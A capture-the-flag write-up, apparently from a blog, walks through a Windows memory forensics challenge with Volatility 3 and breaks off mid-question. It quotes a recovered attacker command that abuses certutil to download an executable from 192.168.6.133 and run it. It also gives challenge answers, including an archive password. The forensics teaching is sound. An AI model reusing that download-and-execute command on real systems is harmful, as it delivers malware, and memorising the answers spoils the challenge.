<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*J3FSVatkytH_ZCsgbxAstw.png" /></figure><p>This one is a Windows Memory Forensics challenge that I intentionally made it easier than the Quals challenge. The main goal was to introduce participants to <strong>Volatility 2 &amp; 3 </strong>and helping them understand how different plugins can be used to extract useful evidence from a memory dump.</p><p>I highly recommend using this cheat sheet while using volatility to make everything easier and faster → <a href="https://blog.onfvp.com/post/volatility-cheatsheet/">VOL cheat sheet</a></p><p>I will start with volatility3 which is much easier for usage and more straightforward.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/722/1*YUHZeMcnwBnpY0nJ6V1y_Q.png" /></figure><h4>Q1: What is the PID of the suspicious process observed on the victim’s machine?</h4><p>Starting by this question we can use the plugins used to see the processes which were active then so by using <strong>windows.pslist </strong>plugin</p><pre>python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.pslist</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*TCwKWgMrc7KhhF7d29Y6gQ.png" /></figure><p>From there we can see a process named Patchupdater.exe which was opened from cmd.exe and both processes were created at approximately the same time which is a highly suspicious thing .</p><p>Answer: <strong>3052</strong></p><h4>Q2: What is the full command typed by the insider to download that malicious executable?</h4><p>To view the written command we can use <strong>windows.cmdline</strong> plugin</p><pre>python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.cmdline</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*2i13N91eHlGeJ8CfozVwiQ.png" /></figure><p>Here we can see the written command and got our answer easily You can grep by the <strong>cmd</strong> process ID we found before using grep to narrow the results.</p><pre>python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.cmdline | grep -i &quot;2968&quot;<br><br>2968    cmd.exe &quot;C:\Windows\system32\cmd.exe&quot; /k &quot;cd /d C:\Windows\Temp &amp; certutil -urlcache -f http://192.168.6.133:8888/PatchUpdater.exe PatchUpdater.exe &amp; .\PatchUpdater.exe --server 192.168.6.133 --port 8080&quot;</pre><p>The command first changes the working directory to C:\Windows\Temp, then abuses certutil.exe to download PatchUpdater.exe from 192.168.6.133:8888, and finally executes the downloaded binary.</p><h4>Q3: What legitimate Windows utility was abused to download the suspicious executable?</h4><p>From the previously detected command we already know what the attacker abused which is certutil.exe</p><ul><li>ANSWER: certutil.exe</li></ul><h4>Q4: Mahmoud had an important archive that he protected by a special password. This password is left somewhere on his desktop. Can you get this password?</h4><p>Since the question tells us that the password was left somewhere on the Desktop, we can start by searching for files associated with the user’s Desktop using Volatility 3’s <strong>windows.filescan</strong> plugin:</p><pre>python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem windows.filescan | grep -i &quot;desktop&quot;</pre><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*J3DZN9wg63GedQhEvdzKXw.png" /></figure><p>It seems that CREDS.txt file contains the password we need so we need to recover it from the memory.</p><p>The address shown by windows.filescan comes from Volatility’s scan for _FILE_OBJECT structures in memory.</p><p>In this case, we can pass that address to <strong>windows.dumpfiles</strong> using the --physaddr option and attempt to reconstruct the cached file content.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*wSZNz8Ljytw-c8GwY_NcgQ.png" /></figure><p>So there we got the password which is <strong>0mK3LALAW3LdT </strong>and we can see the archive name too <strong>IMP-Financial Records.7z .</strong></p><ul><li>ANSWER: <strong>0mK3LALAW3LdT</strong></li></ul><h4>Q5: What is the important data Mahmoud was trying to hide inside that archive?</h4><p>We already got the archive name so by using the same plugin <strong>windows.filescan </strong>and grepping for the archive name.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*1C0BlBlBv6hkUp9-75lkKg.png" /></figure><p>So we should dump that too to see what Mahmoud was trying to hide.</p><pre>python3 vol.py -f ../Windows\ 7\ x64-a8761f34.vmem -o ../dumped windows.dumpfiles --physaddr 0x7e1bc070</pre><p>and there we can see our dumped files</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*aqImkJKTrHV8mNBglSacQA.png" /></figure><p>Volatility produces both .dat and .vacb files depending on how the file was represented in memory.</p><p>In our case, we should focus on the <strong>.dat file</strong>, as it represents data recovered from the file’s DataSectionObject, which is the representation we want to inspect for the archive itself.</p><p>The .vacb file, on the other hand, comes from the SharedCacheMap and represents data maintained by the Windows Cache Manager.</p><p>Since our goal is to recover and inspect the archive, we will continue our analysis using the dumped <strong>.dat file</strong>.</p><p>by unzipping the archive using the password we got before we can see the hidden content
